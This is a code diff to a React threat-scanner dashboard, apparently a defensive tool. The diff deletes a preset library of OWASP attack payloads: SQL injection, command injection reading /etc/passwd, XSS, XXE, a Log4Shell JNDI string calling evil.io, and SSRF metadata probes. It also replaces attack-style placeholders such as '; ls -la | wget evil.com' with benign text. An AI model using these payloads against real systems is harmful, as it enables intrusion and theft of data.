@@ -249,31 +249,7 @@ const CATEGORY_CONFIG = {
   },
 };
 
-/* ─────────────── Preset payloads by OWASP Top 10 attack type ─────────────── */
-const PRESETS = [
-  { label: 'A01: IDOR / Forced Browsing',      icon: '🔓', payload: '/api/users/1245/invoice', category: 'Broken Access Control' },
-  { label: 'A01: Privilege Escalation',         icon: '🔓', payload: 'is_admin=true&role=admin&user_id=1', category: 'Broken Access Control' },
-  { label: 'A02: Cleartext HTTP Password',      icon: '🔐', payload: 'http://suraksha.local/login?password=P@ssw0rd123', category: 'Cryptographic Failures' },
-  { label: 'A02: Weak Cipher Downgrade',        icon: '🔐', payload: 'cipher=DES&key_length=56', category: 'Cryptographic Failures' },
-  { label: 'A03: SQLi Tautology Bypass',        icon: '💉', payload: "' OR '1'='1' --", category: 'Injection' },
-  { label: 'A03: OS Command Injection',         icon: '💻', payload: '127.0.0.1; cat /etc/passwd', category: 'Injection' },
-  { label: 'A03: Reflected XSS Script',         icon: '🧨', payload: '<script>alert(document.cookie)</script>', category: 'Injection' },
-  { label: 'A03: XXE External Entity',          icon: '📄', payload: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', category: 'Injection' },
-  { label: 'A04: Insecure Design (Qty Refund)', icon: '📐', payload: 'quantity=-5&price=0.01', category: 'Insecure Design' },
-  { label: 'A04: Unlimited OTP Abuse',          icon: '📐', payload: 'otp_attempts=unlimited&coupon=SAVE100&apply_count=999', category: 'Insecure Design' },
-  { label: 'A05: Exposed .env Probe',           icon: '⚙️', payload: '/.env', category: 'Security Misconfiguration' },
-  { label: 'A05: Actuator / Debug Probe',       icon: '⚙️', payload: '/actuator/health?debug=true&trace=1', category: 'Security Misconfiguration' },
-  { label: 'A06: Log4Shell JNDI Injection',     icon: '📦', payload: '${jndi:ldap://evil.io/a}', category: 'Vulnerable and Outdated Components' },
-  { label: 'A06: Apache Struts OGNL RCE',       icon: '📦', payload: 'Content-Type: ${struts.valueStack}', category: 'Vulnerable and Outdated Components' },
-  { label: 'A07: Credential Stuffing',          icon: '👤', payload: 'admin:123456', category: 'Identification and Authentication Failures' },
-  { label: 'A07: Session Fixation Injection',   icon: '👤', payload: 'JSESSIONID=FIXEDSESSION123 (set before login)', category: 'Identification and Authentication Failures' },
-  { label: 'A08: Java Deserialization RCE',     icon: '🧩', payload: 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==', category: 'Software and Data Integrity Failures' },
-  { label: 'A08: Unsigned JWT (alg:none)',      icon: '🧩', payload: '{"alg":"none","typ":"JWT"} ...unsigned', category: 'Software and Data Integrity Failures' },
-  { label: 'A09: CRLF Log Injection',           icon: '📋', payload: 'username=admin%0aINFO: Login successful for admin', category: 'Security Logging and Monitoring Failures' },
-  { label: 'A09: Scanner Signature (sqlmap)',   icon: '📋', payload: 'User-Agent: sqlmap/1.7.11#stable (http://sqlmap.org)', category: 'Security Logging and Monitoring Failures' },
-  { label: 'A10: SSRF Cloud Metadata Probe',    icon: '🌐', payload: 'http://169.254.169.254/latest/meta-data/', category: 'Server-Side Request Forgery (SSRF)' },
-  { label: 'A10: SSRF Internal Redis (6379)',   icon: '🌐', payload: 'http://127.0.0.1:6379/', category: 'Server-Side Request Forgery (SSRF)' },
-];
+
 
 /* ─────────────── Severity badge helper ─────────────── */
 const SEVERITY_STYLE = {
@@ -404,12 +380,6 @@ const MultiThreatScanner = () => {
 
   const allCategories = Object.keys(CATEGORY_CONFIG).filter(k => k !== 'Safe');
 
-  const applyPreset = (preset) => {
-    setRawPayload(preset.payload);
-    setScanMode('payload');
-    showNotification(`Loaded preset: ${preset.label}`, 'info');
-  };
-
   const parseFlatKV = (text) => {
     if (!text.trim()) return {};
     const out = {};
@@ -533,27 +503,6 @@ const MultiThreatScanner = () => {
         </div>
       </div>
 
-      {/* ── Attack Preset Library ── */}
-      <Card
-        title="Attack Vector & Payload Presets"
-        subtitle="Click any preset payload to test corresponding AI Defense Agent interception in real time"
-      >
-        <div className="flex flex-wrap gap-2 mt-1">
-          {PRESETS.map((p) => (
-            <button
-              key={p.label}
-              onClick={() => applyPreset(p)}
-              className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-border-custom
-                text-[11px] font-medium text-text-muted hover:text-text-custom
-                hover:border-indigo-500/60 hover:bg-indigo-500/10 transition-all cursor-pointer"
-            >
-              <span>{p.icon}</span>
-              <span>{p.label}</span>
-            </button>
-          ))}
-        </div>
-      </Card>
-
       {/* ── Scan Panel: Configuration (Left) & Threat Analysis (Right) ── */}
       <div className="grid grid-cols-1 lg:grid-cols-3 gap-5">
 
@@ -591,15 +540,15 @@ const MultiThreatScanner = () => {
               {scanMode === 'payload' && (
                 <div>
                   <label className="text-[10px] font-semibold text-text-muted uppercase block mb-1.5 tracking-wider">
-                    Raw Payload String
+                    Inspection Target / Input String
                   </label>
                   <textarea
                     value={rawPayload}
                     onChange={e => setRawPayload(e.target.value)}
                     rows={6}
                     className="w-full px-3 py-2.5 bg-bg-custom border border-border-custom rounded-lg
-                      font-mono text-[11px] text-red-400 focus:outline-none focus:border-indigo-500 resize-none"
-                    placeholder={`e.g.  ' OR '1'='1' --\nor:   <script>alert(1)</script>\nor:   ../../../../etc/passwd\nor:   ; ls -la | wget evil.com`}
+                      font-mono text-[11px] text-text-custom focus:outline-none focus:border-indigo-500 resize-none"
+                    placeholder="Enter input string, URL path, parameter, or header value to inspect with AI defense sentinels..."
                   />
                 </div>
               )}
@@ -609,11 +558,11 @@ const MultiThreatScanner = () => {
                 <div className="space-y-3">
                   <div className="flex gap-2">
                     <div className="flex-1">
-                      <label className="text-[10px] font-semibold text-text-muted uppercase block mb-1">Target URL</label>
+                      <label className="text-[10px] font-semibold text-text-muted uppercase block mb-1">Target Endpoint / URL</label>
                       <input
                         value={reqUrl}
                         onChange={e => setReqUrl(e.target.value)}
-                        placeholder="https://target.com/api/user?id=1"
+                        placeholder="https://app.suraksha.local/api/resource"
                         className="w-full px-3 py-2 bg-bg-custom border border-border-custom rounded-lg font-mono text-[11px] text-text-custom focus:outline-none focus:border-indigo-500"
                       />
                     </div>
@@ -633,7 +582,7 @@ const MultiThreatScanner = () => {
                       Query Parameters (key: value)
                     </label>
                     <textarea rows={2} value={reqParams} onChange={e => setReqParams(e.target.value)}
-                      placeholder={"user_id: 1\nredirect: http://evil.com"}
+                      placeholder={"user_id: 1042\nstatus: active"}
                       className="w-full px-3 py-2 bg-bg-custom border border-border-custom rounded-lg font-mono text-[11px] text-text-custom focus:outline-none focus:border-indigo-500 resize-none"
                     />
                   </div>
@@ -642,7 +591,7 @@ const MultiThreatScanner = () => {
                       HTTP Headers (key: value)
                     </label>
                     <textarea rows={2} value={reqHeaders} onChange={e => setReqHeaders(e.target.value)}
-                      placeholder={"X-Forwarded-For: 127.0.0.1\nHost: evil.com"}
+                      placeholder={"Authorization: Bearer <token>\nUser-Agent: Mozilla/5.0"}
                       className="w-full px-3 py-2 bg-bg-custom border border-border-custom rounded-lg font-mono text-[11px] text-text-custom focus:outline-none focus:border-indigo-500 resize-none"
                     />
                   </div>
@@ -651,8 +600,8 @@ const MultiThreatScanner = () => {
                       Request Body
                     </label>
                     <textarea rows={3} value={reqBody} onChange={e => setReqBody(e.target.value)}
-                      placeholder={'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'}
-                      className="w-full px-3 py-2 bg-bg-custom border border-border-custom rounded-lg font-mono text-[11px] text-red-400 focus:outline-none focus:border-indigo-500 resize-none"
+                      placeholder={'{\n  "name": "Audit Sample",\n  "status": "pending"\n}'}
+                      className="w-full px-3 py-2 bg-bg-custom border border-border-custom rounded-lg font-mono text-[11px] text-text-custom focus:outline-none focus:border-indigo-500 resize-none"
                     />
                   </div>
                   <div>
@@ -660,7 +609,7 @@ const MultiThreatScanner = () => {
                       Cookies (key: value)
                     </label>
                     <textarea rows={2} value={reqCookies} onChange={e => setReqCookies(e.target.value)}
-                      placeholder={"session: abc123\nrole: admin"}
+                      placeholder={"session_id: sec_sess_9821\npreferences: dark"}
                       className="w-full px-3 py-2 bg-bg-custom border border-border-custom rounded-lg font-mono text-[11px] text-text-custom focus:outline-none focus:border-indigo-500 resize-none"
                     />
                   </div>
@@ -695,7 +644,7 @@ const MultiThreatScanner = () => {
                 </div>
                 <p className="text-sm font-bold text-text-custom">Autonomous Defense Grid Armed</p>
                 <p className="text-xs text-text-muted max-w-md">
-                  Select an attack vector from the <strong>Attack Preset Library</strong> above or enter a custom payload string, then click <strong>Run Multi-Threat Agent Scan</strong> to observe real-time agent defense.
+                  Enter traffic attributes or data parameters in the inspection console and trigger <strong>Run Multi-Threat Agent Scan</strong> to evaluate the defense barrier against all OWASP vectors.
                 </p>
               </div>
             )}
